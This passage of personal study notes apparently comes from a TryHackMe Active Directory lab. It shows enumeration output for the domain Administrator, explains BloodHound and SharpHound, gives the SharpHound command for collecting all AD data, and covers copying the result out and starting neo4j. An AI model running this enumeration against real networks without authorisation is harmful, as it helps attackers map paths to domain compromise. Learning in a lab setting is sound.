distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com
name              : Administrator
objectClass       : user
objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30f
SamAccountName    : Administrator
SID               : S-1-5-21-3330634377-1326264276-632209373-500
```

#### Bloodhound
GUI for using `Sharphound` as input to visualise it into attack paths

uses `Neo4j` as its `backend database` and `graphing system`
(`Neo4j` is a graph database management system)

`Sharphound` is a tool for AD enumeration (aka `collector`)
There are other collectors like `AzureHound.ps1` for `Azure` enumeration
run `SharpHound` on targeted Windows
`.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`
Awfully noisy, but you can plan you next attack easier now

move created zip to Kali, e.g.
`scp AD_USERNAME@THMJMP1.za.tryhackme.com:C:/Users/AD_USERNAME/Documents/<Sharphound ZIP> .`

`sudo pacman -S bloodhound` - blackarch install neo4j as dependency (nicely done)
`sudo systemctl start neo4j` - this might be wrong (I did this, and than `neo4j` start - seems redundant but I'm not sure)
`sudo neo4j start`
`http://localhost:7474` - browser interface

